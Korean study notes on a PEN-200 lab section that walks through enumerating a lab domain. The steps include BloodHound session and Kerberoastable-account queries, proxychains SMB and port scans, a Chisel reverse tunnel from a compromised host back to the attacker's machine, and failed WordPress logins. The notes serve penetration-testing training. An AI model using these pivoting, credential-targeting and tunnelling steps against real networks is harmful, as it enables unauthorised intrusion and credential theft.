# 27.4.2 서비스와 세션

> **Services and Sessions** · PEN-200 §27.4.2

이 절의 세 갈래 — 활성 사용자 세션 확인, 계정의 SPN 확인, 그리고 SOCKS5 프록시를 깔아 Nmap·CrackMapExec 로 접근 가능한 서비스 열거.

세션은 BloodHound 의 관계 질의로 봄. Cypher 의 관계 문법은 `(NODES)-[:RELATIONSHIP]->(NODES)` 이고, 여기서는 `[:HasSession]` 의 출발 노드가 컴퓨터, 도착 노드가 사용자임.

```
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

*모든 활성 세션 표시*

세션은 셋 —

- CLIENTWK1 ↔ marcus — 예상대로 우리가 붙어 있는 세션
- **MAILSRV1 ↔ beccy** — 도메인 관리자가 세션을 유지 중. 이 머신에 특권 접근을 얻으면 해당 사용자의 NTLM 해시를 뽑을 여지가 있음
- INTERNALSRV1 ↔ SID 로 표시된 계정 — BloodHound 는 SID 의 도메인 식별자가 «로컬 머신»일 때 이렇게 표기함. RID 500 이므로 **로컬 Administrator** 의 세션임

다음은 kerberoastable 계정 식별 — 사전 질의 List all Kerberoastable Accounts 로 `krbtgt` 와 **daniela** 가 나옴. `krbtgt` 는 KDC 의 서비스 계정으로 Kerberos 티켓의 암호화·서명을 담당하는데, 도메인 구축 시 비밀번호가 무작위 생성되므로 비밀번호 공격이 사실상 불가함 → Kerberoasting 맥락에서는 통상 건너뜀.

daniela 노드의 Node Info 에서 매핑된 SPN 이 `http/internalsrv1.beyond.com` 임을 확인 → INTERNALSRV1 에 웹 서버가 돈다고 추정 가능.

*proxychains 를 통한 SMB 열거 — 호스트별 `signing:` 값과 `[+] beyond.com\john:...` 인증 성공, 그리고 공유별 `Permissions` 열이 아래 두 판정의 근거임. 명령·공유명이 두 줄로 갈린 것은 교재 지면 폭 때문임*

*21·80·443 포트 스캔 — 세 호스트의 포트 상태가 각각 찍힘. 172.16.6.241 은 역방향 조회로 `internalsrv1.beyond.com` 이름까지 드러남*

결과 — INTERNALSRV1(172.16.6.241)에 80·443, MAILSRV1(172.16.6.254)에 80 개방. 후자는 외부에서 이미 열거한 그 웹 서비스일 가능성이 커서 후순위로 미룸.

프록시체인으로도 열람은 되지만 브라우저 세션은 불안정해서, INTERNALSRV1 의 웹은 Chisel 로 역방향 포트포워딩해 접근함. Kali 쪽을 서버 모드로 8080 에 띄우고 `--reverse` 로 역방향 포워딩을 허용.

*Meterpreter 세션으로 Chisel 전송*

대상에서 클라이언트 모드로 되돌아 붙임. 문법은 `R:localport:remotehost:remoteport` — 로컬 80 을 172.16.6.241 의 80 으로 연결.

```
C:\Users\marcus> chisel.exe client 192.168.119.5:8080 R:80:172.16.6.241:80
2022/10/11 07:22:46 client: Connecting to ws://192.168.119.5:8080
2022/10/11 07:22:46 client: Connected (Latency 11.0449ms)
```

*INTERNALSRV1 의 80 포트로 역방향 포트포워딩*

이제 Kali 의 `127.0.0.1` 로 붙으면 INTERNALSRV1 의 WordPress 가 뜸. 다만 `/wordpress/wp-admin` 은 `internalsrv1.beyond.com` 으로 리다이렉트되며 실패함 — WordPress 인스턴스가 IP 가 아니라 DNS 이름으로 설정돼 있고 Kali 는 그 이름을 모르기 때문임. `/etc/hosts` 에 `internalsrv1.beyond.com` 을 `127.0.0.1` 로 등록하면 로그인 페이지가 정상 표시됨.

```
kali@kali:~/beyond$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
...
127.0.0.1    internalsrv1.beyond.com
...
```
*추가한 항목 — 포워딩 종단이 로컬이므로 `127.0.0.1` 로 매핑함*

확보한 자격 증명과 `admin:admin` 류 흔한 조합은 전부 실패 → 로그인은 다른 경로가 필요함.
